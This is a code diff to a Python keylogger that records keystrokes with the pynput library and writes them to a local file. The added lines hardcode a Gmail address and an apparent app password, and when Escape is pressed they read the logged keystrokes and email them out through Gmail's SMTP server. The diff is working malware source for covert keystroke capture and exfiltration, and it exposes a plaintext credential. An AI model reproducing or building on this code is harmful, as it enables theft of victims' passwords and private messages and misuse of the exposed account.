@@ -1,4 +1,10 @@
+import smtplib
+
 from pynput.keyboard import Key, Listener
+
+EMAIL_ADDRESS = '126330392k@gmail.com'
+PASSWORD = 'zlqtphytmtmwwdbx'
+
 
 count = 0
 keys = []
@@ -22,13 +28,27 @@ def write_file(keys):
         for key in keys:
             k = str(key).replace("'", "")
             if k.find("space") > 0:
-              f.write('\n')
+                f.write('\n')
             elif k.find("Key") == -1:
                 f.write(k)
 
 
 def on_release(key):
     if key == Key.esc:  # Escape to exit
+        sendto = '126330392k@gmail.com'
+        subject = 'Keylogger Output'
+
+        file_location = "C:\\Users\GGPC\Documents\GitHub\KeyLogger\output.txt"
+
+        with open(file_location) as f:
+            message = f.read()
+
+        server = smtplib.SMTP('smtp.gmail.com', 587)
+        server.starttls()
+        server.login(EMAIL_ADDRESS, PASSWORD)
+        text = "Subject: {}\n\n{}".format(subject, message)
+        server.sendmail(EMAIL_ADDRESS, sendto, text)
+
         return False
 
 
